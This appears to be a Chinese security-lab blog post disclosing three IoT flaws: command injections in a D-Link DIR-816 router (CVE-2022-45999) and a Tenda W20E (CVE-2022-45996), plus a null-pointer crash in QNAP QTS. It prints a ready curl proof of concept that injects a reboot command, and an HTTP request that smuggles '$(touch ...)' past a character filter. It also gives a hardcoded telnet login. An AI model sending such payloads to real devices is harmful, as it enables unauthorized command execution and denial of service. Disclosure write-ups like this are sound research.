#  从命令注入到空指针：IoT漏洞的挖掘   
原创 wh1tep0et  白帽100安全攻防实验室   2023-08-16 11:54  
  
# Dlink DIR-816 命令注入漏洞  
## Overview  
```
厂商网址：https://www.dlink.com/

固件下载地址：http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-816
```  
## Vulnerability information  
  
Dlink DIR-816A2_FWv1.10CNB05中存在一个命令注入漏洞，可以在路由系统中执行任意命令。  
## Affected version  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrE9uMZZuJSibSUOhibdP5MlWakHoaicB9L8bvDXPouUWBbwzhp6CqqFSCA/640?wx_fmt=png "")  
  
图中显示了路由器的最新固件:A2_FWv1.10CNB05  
## Vulnerability details  
  
在webs上可以看到硬件版本是A2 1.10。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrlib0ZqibqJOqS734gKxiaeMgHibGODbPUUjbLFRKDPkcicR1piclnRMgB61Q/640?wx_fmt=png "")  
  
在goahead中，我们可以在sub_45AC4C中找到代码细节，程序将通过pingAddr参数获得的内容传递给V2。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrbavjibXldibZ5uXAktuSliaFrvp701MlFy9vteNManFLQHpe4TQqyJLAw/640?wx_fmt=png "")  
  
然后，通过snprintf函数将V2匹配的内容格式化为V10。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFr1u2rDVV6pb9Oiaj7ePkaiaP7P6pWqOFhskQxTU3XsM8fopbvsxg0Oiaibw/640?wx_fmt=png "")  
  
V10参数由函数doSystembk()调用，存在命令注入漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFr2FD3ibn7RhCyWqq3NIPQZAgKHB0icR9DBEX3eXr2G2iaZ1mHldt0ia1rQg/640?wx_fmt=png "")  
## Vulnerability exploitation condition  
  
需要获取cookie来执行攻击。  
## Recurring vulnerabilities and POC  
  
为了重现该漏洞，可以遵循以下步骤:  
1. 连接物理设备  
  
1. 使用以下shell命令进行攻击  
  
Poc如下  
```
TOKENID=`curl -s http://192.168.0.1/dir_login.asp | grep tokenid | head -1 | grep -o 'value="[0-9]*"' | cut -f 2 -d = | tr -d '"'`

curl -i -X POST http://192.168.0.1/goform/Diagnosis -d tokenid=$TOKENID -d 'pingAddr=192.168.0.1;reboot'
```  
  
  
运行poc后，效果如下，路由器重启，无法连接到路由器。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFr0uvz4xUfuVDstvwjDVGxoLUcbcAiacDEIO7pMALiaia8GWAzzk9icWVyZA/640?wx_fmt=png "")  
## CVE-ID  
  
CVE-2022-45999  
  
# Tenda W20E 命令注入漏洞  
## Overview  
```
厂商官网：https://www.tenda.com.cn/

固件下载地址：https://www.tenda.com.cn/product/download/W20E.html
```  
## Vulnerability information  
  
腾达W20E V16.01.0.6(3392)存在一个命令注入漏洞，可以在系统中执行任意命令。  
## Affected version  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFroMdvyIX1ia49fuRIyiaoUWNdcsjv1cbSK0U6oIQEoRmgBZnykl7wfumQ/640?wx_fmt=png "")  
  
该图显示了最新的固件:V16.01.0.6(3392)  
## Vulnerability details  
  
开启telnet http://192.168.0.1/goform/telnet  
```
telnet admin/password is root/ Fireitup
```  
  
使用ida分析httpd，在函数do_ping_action中:使用ida分析httpd，在函数do_ping_action中:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrLRk9davfB53lbngibn3Mqq4LewxE7lEHyqbibEuQbTdI8AZy28HdtInA/640?wx_fmt=png "")  
  
该程序将通过hostname参数获得的内容传递给hostName。有一些参数的过滤是由if判断的，但我们可以绕过它，这将在下一节解释。然后，通过strncpy函数将hostname的内容复制到cfg.hostname中。而cfg是由函数cmd_get_ping_output()调用的。在函数cmd_get_ping_output中:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrczhCs4RYQYkh16hZXzFUd5j4tg4T5a8selCyWCDib9T4QADOcp4eF2w/640?wx_fmt=png "")  
  
然后通过snprintf函数将cfg.hostname的匹配内容格式化为new_cmd_buf。new_cmd_buf由popen()调用。存在命令注入漏洞。相应的网页如下:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrBic1HeicKcZxjAG2R8ldt9ptWH20X5ibHbQaE54ouMrI6RaZoneGlfHxQ/640?wx_fmt=png "")  
## Vulnerability exploitation condition  
  
登录后需要获取cookie才能执行攻击。在if的判断中，可以看到字符(；| &)进行筛选，如果包含这些字符，代码将失败。但是我们可以用’ $ ‘来进行命令注入。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrLRk9davfB53lbngibn3Mqq4LewxE7lEHyqbibEuQbTdI8AZy28HdtInA/640?wx_fmt=png "")  
  
功能数据包如下，我们将使用它来构建poc。  
```
POST /goform/module?1668695093889 HTTP/1.1
Host: 192.168.0.1
Content-Length: 87
Accept: text/plain, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.1
Referer: http://192.168.0.1/index.html?v=3392
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: password=70ebc4f9c9d22827a5874d1bb6f06abddwdvmy; bLanguage=cn; sessionid=W20Ev5:0.167.3:6b0846
Connection: close

{"setFixTools":{"networkTool":1,"hostName":"test$(touch /tmp/test0)","packageSize":32}}
```  
## Recurring vulnerabilities and POC  
  
为了重现该漏洞，可以遵循以下步骤:1.连接物理设备2.用POC攻击  
  
POC和复制结果如下:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrGrvx3trc2OBO0xSQwoIBnC5mScSibA3BMbDZZlxDEkA9icibencluHqicg/640?wx_fmt=png "")  
  
图显示了POC攻击的效果，创建了文件test0。  
## CVE-ID  
  
CVE-2022-45996CVSS Version 3.x socre: 7.2 high  
  
# QTS 空指针引用漏洞  
## 漏洞信息  
  
我们在 QTS 5.0.1 中发现了一处空指针引用漏洞。如果该漏洞被利用，可以对 QTS 系统造成 DoS 攻击，或者使用精心构造 payload 实现在 QTS 系统上执行任意代码。  
## 影响版本  
  
我们在以下版本中验证了该漏洞的存在：  
- QTS 5.0.1.2277  
  
## 复现漏洞  
  
编写脚本，运行之后填入正确的用户名、密码以及设备的地址。脚本将会构造 payload 并发送到目标设备，造成设备上的 utilRequest.cgi 程序崩溃。从设备的响应内容中也可以看出，程序发生了段错误并异常退出。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrvnSFsLPfNL19gR9iaI8eYVVbuI9nNW0Ptxeiab8R8KnuQBujdrQbrRRw/640?wx_fmt=png "")  
  
可以通过 SSH 登录设备，在运行 PoC 脚本之前事先开启 core dump，通过生成的 core dump 文件确认程序崩溃。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrjK9ZW7fh9zJysvfDJicVwUE1dXH8BjrgTVhKnMwwq11NjMoJia60GRwA/640?wx_fmt=png "")  
## 漏洞细节  
  
该漏洞的触发过程涉及 /home/httpd/cgi-bin/filemanager/utilRequest.cgi 中的多个函数。由于对函数返回值的处理不当，导致一个全局变量（指针）未被成功初始化，而后续处理流程又使用了这个指针，导致程序尝试解引用一个空指针，造成程序崩溃。涉及的函数及它们的调用关系如下：  
```
main
 \- sub_10443B -- handles "share_file" function
     \- sub_103333
         |- sub_102B0F -- fails to initialize the pointer
         |   \- sub_C38F4 -- returns -1
         |       \- sub_C352C -- returns -1
         |           \- Conf_Get_Field_NoLock -- returns -1
         \- sub_FBCEB
             \- strncpy -- tries to dereference the null pointer, causing the program to crash!
```  
  
首先，在 main 函数中，程序识别到 func 为 share_file 后，调用了 sub_10443B 函数，并在其中调用了 sub_103333 函数对一部分参数进行处理。sub_103333 函数首先调用 sub_102B0F 函数，在 sub_102B0F 函数中为 target_var 全局变量分配了 16 字节大小的内存空间（target_var 应该是一个 void ** 类型的指针数组）。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFras8Fq3yQOoPJadicQFxIkMfdBaq1joGX2TibKqDODiaM10GK2UpiaEVUfg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrbM1qSZXx3ibJiacuoVnDQ3FODnrLPZcaxSa9qlsZZSMkxLU6bW3qLnhA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrp77aCJlHPSX6icA9UJOeHic3UuPtlzicGWum92sRKEspiayaMicibyeq1N5g/640?wx_fmt=png "")  
  
程序本应在下图第 88 行处分配内存空间并将地址保存在 target_var[0] 中，但是由于第 67 行处 sub_C38F4 函数返回值小于 0，程序没有执行到第 88 行，而是跳转到了 LABEL_53，LABEL_53 处做了一些简单的处理之后便直接返回，导致 target_var[0] 没有被赋值，其初始值为 0，或者说 NULL 。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrljHoB2xnEk29KoX46YGvsicYVMBS0WU9MdU3DS74jncrRpMlMshWazw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrj55fDAk69u4Um7cxfAOLicqmicFRh9pKDFdibbqYMysJ1wgRuXPsr8gEw/640?wx_fmt=png "")  
  
接着程序执行到 sub_FBCEB 函数中，将 target_var[0] 的值作为 strncpy 的第二个参数。因为前面没有成功为 target_var[0] 分配内存空间，此时传入给 strncpy 函数的第二个参数实际上为 NULL，strncpy 函数中会尝试对这个参数进行解引用，造成 Segmentation Fault，程序崩溃。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrIIP4wHfSmkbIYAtUvFQXNibGJCULkMU0WaYO76grmcWZQbzZhXVXw6w/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFraGD8tgMGgKSLdmZHVeU1icaAV4hRKvUiauiaXiajCeG4jsskQHmmBZx74A/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrLYSXFfoibMrrUQ77ibZH4niawC8HAJHpsAO4ntZlOkVHZGj4XLLAryWRg/640?wx_fmt=png "")  
  
而进一步分析前面返回了负值的 sub_C38F4 函数，其调用了 sub_C352C 函数，在该函数中，程序将参数中的 file_name 值作为 Conf_Get_Field_NoLock 函数的第二个参数，尝试从 /etc/config/smb.conf 配置文件中找到对应的 entry，没有找到则 src 缓冲区为空。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrAyicw3g2Q193EErZxXyzbaqX59pJsEnqZO8ogRknNV4p0PGSIjtT1fw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrjWXYPffibOym0ZAACfqicoJ69PHuIqJgQ5FVyGS8MwTVOzXl4g9icrQ9g/640?wx_fmt=png "")  
  
随后，根据函数逻辑，name 变量被赋值为默认值 MD0_DATA，函数调用 __xstat64 函数尝试获取这个文件的信息，而这个文件在设备上并不存在，因此 __xstat64 函数返回 -1，再一路返回到 sub_C38F4 函数，其也返回 -1，最终按前述过程导致 target_var[0] 指针为 NULL，最后被解引用造成 utilRequest.cgi 程序崩溃。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFrwiaXEKQf7Rfl9KbXLynl2UgQibZLX08hzYTd40hJXRIh4xyLL7b4ZBQQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibsx4ibOQCBSVXGNwogSJvYFriaaJEGFVuRENibqajIv86criaN7MSGza1Ho7V3u4RFiclI9JITkVJTBnWQ/640?wx_fmt=png "")  
  
经过测试，此漏洞无需登录管理员账户，只需要登录普通权限的账户即可触发，因此当攻击者通过其他方式拿到普通用户权限后可以利用此漏洞进行 DoS 攻击。  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aFJv52grsibtxsRYLCF9T0TS74iaL70g7e0NDX7pGnzdDpuI3YHSwwZnYDJ0xxeYOSdZlbWXQ86ibF54TSgfN5VKg/640?wx_fmt=png "")  
  
  
